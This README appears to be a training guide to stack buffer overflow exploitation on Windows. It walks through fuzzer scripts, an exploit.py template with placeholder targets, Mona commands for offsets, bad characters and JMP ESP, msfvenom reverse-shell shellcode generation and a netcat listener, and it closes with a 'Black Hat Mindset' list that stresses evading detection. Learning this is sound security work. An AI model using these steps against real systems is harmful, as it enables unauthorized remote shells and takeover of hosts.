# Basic Methodology - Buffer Overflow

This README explores techniques for exploiting buffer overflow vulnerabilities using Immunity Debugger and Mona, covering fuzzing, EIP control, bad character identification, jump point discovery, payload generation, and NOP sleds.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Tools](#tools)
- [Buffer Overflow Process](#buffer-overflow-process)
  - [Launching Immunity Debugger](#launching-immunity-debugger)
  - [Configuring Mona](#configuring-mona)
  - [Fuzzing the Application](#fuzzing-the-application)
  - [Replicating the Crash and Controlling EIP](#replicating-the-crash-and-controlling-eip)
  - [Finding Bad Characters](#finding-bad-characters)
  - [Locating a Jump Point](#locating-a-jump-point)
  - [Generating and Injecting Payload](#generating-and-injecting-payload)
  - [Prepending NOPs](#prepending-nops)
  - [Starting a Listener](#starting-a-listener)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Buffer overflow exploits take advantage of applications that fail to properly handle input, allowing attackers to overwrite memory and execute malicious code. This guide uses Immunity Debugger and Mona to systematically exploit such vulnerabilities, from fuzzing to payload execution.

## Setup and Prerequisites

### Environment
- Windows host with administrative privileges.

### Tools Required
- **Immunity Debugger** - Install and launch.
- **Mona** - Download and place `mona.py` in `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\`.
- **Python 2.7.14** or higher - Install for running Python scripts.
- **msfvenom** - Part of Metasploit Framework.
- **netcat** - Install (e.g., `apt install netcat` on Linux or use Windows equivalent).

### Requirements
- Target: A vulnerable .exe file to analyze.
- Network: Identify the target IP and port for reverse shells.

## Tools

- **Immunity Debugger**: A debugger for analyzing and exploiting Windows applications.
- **Mona**: A Python script for Immunity Debugger to assist with buffer overflow exploitation (e.g., pattern generation, bad character analysis).

## Buffer Overflow Process

### Launching Immunity Debugger

1. Open Immunity Debugger and load the target .exe file:
   - File > Open or File > Attach to the process.

### Configuring Mona

1. Run Mona commands in the Immunity Debugger terminal (red rectangle).
2. Set the working directory:
```
!mona config -set workingfolder c:\mona\%p
```

### Fuzzing the Application

Use a fuzzer script to crash the application.

**fuzzer.py**:
```python
import socket, time, sys

IP = "<IP>"
PORT = <PORT>
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((IP, PORT))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send(string)
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + IP + ":" + str(PORT))
        sys.exit(0)
    time.sleep(1)
```

**fuzzer2.py**:
```python
import socket

IP = "<IP>"
PORT = <PORT>

payload = 1000 * "A"

try: 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP,PORT))
    s.send(payload)
    print "[+] " + str(len(payload)) + " Bytes Sent"
except:
    print "[-] Crashed"
```

1. Modify IP and PORT in the scripts.
2. Run the script until the application crashes with EIP = 41414141 (hex for "AAAA").

### Replicating the Crash and Controlling EIP

1. Generate a cyclic pattern to find the offset:
```
# Using Mona
!mona pc <SIZE>

# Using Metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <SIZE>
```

2. Update exploit.py with the pattern:
```python
import socket

ip = "<IP>"
port = <PORT>

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "<CYCLIC_PATTERN>"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

3. Re-run exploit.py and use:
```
!mona findmsp -distance <SIZE>
```

4. Update exploit.py with the offset and set retn = "BBBB":
```python
offset = <OFFSET>
overflow = "A" * offset
retn = "BBBB"
payload = ""
```

5. Re-run to confirm EIP = 42424242 (hex for "BBBB").

### Finding Bad Characters

1. Generate a byte array excluding \x00:
```
!mona bytearray -b "\x00"
```

2. Copy the byte array to payload in exploit.py and re-run.

3. Analyze bad characters:
```
!mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>
```

4. Exclude found bad characters and repeat:
```
!mona bytearray -b "\x00\x01\x02\x03"
```

5. Continue until Unmodified status is returned.

### Locating a Jump Point

1. Search for a JMP ESP address:
```
# Inside .exe
!mona jmp -r esp -cpb "<BAD_CHARS>"

# Inside DLL
!mona modules    # find a DLL with Rebase, SafeSEH, ASLR, NXCompat set to False
!mona find -s "\xff\xe4" -m <DLL>
```

2. Update retn in exploit.py with the address in little-endian format:
```python
retn = "\xaf\x11\x50\x62"  # Example: 0x625011af
```

### Generating and Injecting Payload

Generate shellcode with msfvenom:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "<BAD_CHARS>" -f c
```

Copy the shellcode to payload in exploit.py.

### Prepending NOPs

Add a NOP sled to improve reliability:
```python
padding = "\x90" * 16
```

Update buffer in exploit.py to include padding.

### Starting a Listener

Start a netcat listener to catch the reverse shell:
```bash
nc -lvp <PORT>
```

## Black Hat Mindset

- **Identify Vulnerabilities**: Use fuzzing to crash applications and locate exploitable buffers.
- **Control Execution**: Overwrite EIP to redirect execution to your code.
- **Avoid Detection**: Exclude bad characters and use NOP sleds for reliable exploitation.
- **Gain Access**: Deploy reverse shells to establish remote control.
- **Stay Silent**: Leverage in-memory techniques to avoid file-based detection.

## Resources

- [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
- [Mona GitHub](https://github.com/corelan/mona)
- [Metasploit Framework](https://www.metasploit.com/)
- [Corelan Buffer Overflow Tutorial](https://www.corelan.be/index.php/articles/)

